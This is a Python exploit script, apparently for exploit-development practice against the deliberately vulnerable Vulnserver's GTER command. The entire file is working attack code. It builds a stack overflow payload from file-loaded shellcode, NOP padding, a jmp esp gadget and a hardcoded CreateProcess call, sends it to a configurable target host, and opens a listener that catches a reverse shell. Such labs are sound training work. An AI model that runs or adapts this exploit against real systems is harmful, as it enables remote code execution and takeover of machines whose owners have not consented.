#!/usr/bin/env python3
#
# Vulnserver: GTER
# * pwntools
# * metasploit reverse_tcp payload
# * Ropper

import sys
import pwn
from threading import Thread


# set target info
RHOST = '127.0.0.1'
RPORT = 9999
LPORT = 4444


def generate_payload():
    NOP = pwn.asm("nop")  # noqa: F841
    payload = ""

    shellcode = pwn.asm("mov sp, 0xF516")  # move stack further and keep alignment

    with open("shellcode", "r") as f:
        shellcode += f.read()

    payload += shellcode
    payload += NOP * (150 - len(payload))
    GADGET_JMP_ESP = pwn.p32(0x62501203)  # jmp esp
    payload += GADGET_JMP_ESP

    # need to jump at the begining of the buffer
    stage1 = ""
    stage1 += pwn.asm("add eax, 6")
    stage1 += pwn.asm("jmp eax")

    # last few bytes of shellcode go over here... it's complicated.
    last_ops = ""
    last_ops += pwn.asm("mov ebx, 0x77332082")  # hardcoded CreateProcess
    last_ops += pwn.asm("call ebx")

    payload += stage1
    payload += last_ops

    return "GTER .{}\n".format(payload)


def attack():
    r = pwn.remote(RHOST, RPORT, typ="tcp")
    r.send(generate_payload())


if __name__ == "__main__":
    if len(sys.argv) > 1:
        RHOST = sys.argv[1]

    thread = Thread(target=attack)
    thread.start()

    listener = pwn.listen(port=LPORT)
    listener.wait_for_connection()
    listener.interactive()

    thread.join()
